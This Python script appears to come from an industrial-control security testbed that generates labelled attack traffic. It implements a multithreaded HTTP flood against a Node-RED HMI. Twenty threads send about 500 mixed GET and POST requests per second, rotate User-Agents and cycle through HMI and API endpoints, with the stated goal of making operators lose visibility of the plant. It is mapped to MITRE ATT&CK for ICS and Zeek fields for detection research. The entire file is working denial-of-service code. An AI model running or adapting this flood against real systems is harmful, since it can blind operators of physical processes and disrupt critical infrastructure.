"""
Attack #5: HTTP Flood (Denial of Service)
==================================================================
Floods the Node-RED HMI web interface with HTTP requests until it stops responding.
Effect: the operator loses access to the HMI, resulting in loss of visibility.

Packet rate targets:
  - ~500-1,000 req/s (20 threads x 25-50 req/s)
  - Mix of GET and POST requests
  - Persistent connection plus connection cycling (two modes)

MITRE ATT&CK for ICS: T0814 - Denial of Service / T0826 - Loss of Availability
Zeek signature: http.log -> method, uri, status_code, request_body_len
"""

import time
import sys
import os
import socket
import random
import threading

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
from network_attacks.net_config import (
    HMI_IP, HMI_PORT, DEFAULT_NET_DURATION,
    LABEL_HTTP_FLOOD, NET_DURATIONS
)

ATTACK_NAME = "HTTP_Flood"
ATTACK_ID   = LABEL_HTTP_FLOOD

# ---------------------------------------------------------------------------
# Attack parameters
# ---------------------------------------------------------------------------
THREAD_COUNT = 20         # Increased thread count
REQ_PER_SEC  = 25         # Per thread (total ~500 req/s)

# Node-RED HMI endpoints
HMI_ENDPOINTS = [
    "/",
    "/ui",
    "/ui/",
    "/ui/#/0",
    "/api/flows",
    "/api/nodes",
    "/flows",
    "/nodes",
    "/settings",
    "/credentials",
    "/debug/view",
    "/comms",
    "/theme",
    "/context",
    "/icons",
    "/catalog",
]

# POST endpoints (heavier load)
POST_ENDPOINTS = ["/api/flows", "/api/nodes", "/flows"]

# Different User-Agents -> realistic traffic
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120",
    "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/121.0",
    "Python-SCADA-Client/1.0",
    "curl/7.88.1",
    "Go-http-client/1.1",
    "node-RED-Client/3.1",
]

BODY_SIZES = [128, 256, 512, 1024, 2048, 5380]   # Realistic POST body sizes


def _make_get_request(host, port, path):
    ua = random.choice(USER_AGENTS)
    return (
        f"GET {path} HTTP/1.1\r\n"
        f"Host: {host}:{port}\r\n"
        f"User-Agent: {ua}\r\n"
        f"Accept: text/html,application/json,*/*\r\n"
        f"Accept-Encoding: gzip, deflate\r\n"
        f"Connection: close\r\n"
        f"\r\n"
    ).encode()


def _make_post_request(host, port, path):
    body_size = random.choice(BODY_SIZES)
    body      = '{"id":"' + 'X' * (body_size - 10) + '"}'
    ua        = random.choice(USER_AGENTS)
    return (
        f"POST {path} HTTP/1.1\r\n"
        f"Host: {host}:{port}\r\n"
        f"User-Agent: {ua}\r\n"
        f"Content-Type: application/json\r\n"
        f"Content-Length: {len(body)}\r\n"
        f"Connection: close\r\n"
        f"\r\n"
        f"{body}"
    ).encode()


def _http_flood_worker(target_ip: str, target_port: int,
                       stop_event: threading.Event,
                       counter: list, error_counter: list):
    """HTTP flood worker - each request opens a new connection."""
    interval = 1.0 / REQ_PER_SEC

    while not stop_event.is_set():
        endpoint = random.choice(HMI_ENDPOINTS)

        # 20% chance of POST, 80% GET
        if endpoint in POST_ENDPOINTS and random.random() < 0.2:
            data = _make_post_request(target_ip, target_port, endpoint)
        else:
            data = _make_get_request(target_ip, target_port, endpoint)

        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(3.0)
            s.connect((target_ip, target_port))
            s.sendall(data)
            # Read the response, then close immediately (flood effect)
            try:
                s.recv(256)
            except Exception:
                pass
            s.close()
            counter[0] += 1
        except Exception:
            error_counter[0] += 1
        time.sleep(interval)


def run_attack(duration_sec=None, label_manager=None, target_ip=None):
    """Multi-threaded HTTP flood."""
    if duration_sec is None:
        duration_sec = NET_DURATIONS.get("http_flood", DEFAULT_NET_DURATION)
    if target_ip is None:
        target_ip = HMI_IP

    est_rps = THREAD_COUNT * REQ_PER_SEC

    print(f"{'='*65}")
    print(f"  ATTACK #{ATTACK_ID}: {ATTACK_NAME}")
    print(f"  Target   : http://{target_ip}:{HMI_PORT}")
    print(f"  Threads  : {THREAD_COUNT} x {REQ_PER_SEC} req/s = ~{est_rps} req/s")
    print(f"  Endpoints: {len(HMI_ENDPOINTS)} distinct paths (GET+POST mix)")
    print(f"  Duration : {duration_sec}s")
    print(f"{'='*65}")

    if label_manager:
        label_manager.log_attack_start(
            ATTACK_ID, ATTACK_NAME,
            f"HTTP flood -> {target_ip}:{HMI_PORT}, ~{est_rps} req/s, {THREAD_COUNT} threads"
        )

    counter       = [0]
    error_counter = [0]
    stop_event    = threading.Event()
    threads       = []

    for _ in range(THREAD_COUNT):
        t = threading.Thread(
            target=_http_flood_worker,
            args=(target_ip, HMI_PORT, stop_event, counter, error_counter),
            daemon=True
        )
        t.start()
        threads.append(t)

    start_time = time.time()
    try:
        while (time.time() - start_time) < duration_sec:
            elapsed = time.time() - start_time
            rem     = duration_sec - elapsed
            rps     = counter[0] / max(elapsed, 0.1)
            print(f"  [HTTP] {counter[0]:,} req | {rps:.0f} req/s | errors:{error_counter[0]} | remaining: {rem:.0f}s")
            time.sleep(5)
    except KeyboardInterrupt:
        print("\n  [HTTP] Manual stop!")
    finally:
        stop_event.set()
        for t in threads:
            t.join(timeout=3)
        elapsed = time.time() - start_time
        rps     = counter[0] / max(elapsed, 0.1)
        if label_manager:
            label_manager.log_attack_end(
                ATTACK_ID, ATTACK_NAME,
                f"{counter[0]:,} requests, {error_counter[0]} errors, {elapsed:.1f}s, {rps:.0f} req/s"
            )
        print(f"\n  [HTTP] {counter[0]:,} requests | {rps:.0f} req/s | {elapsed:.1f}s")
    return True


if __name__ == "__main__":
    run_attack(duration_sec=30)
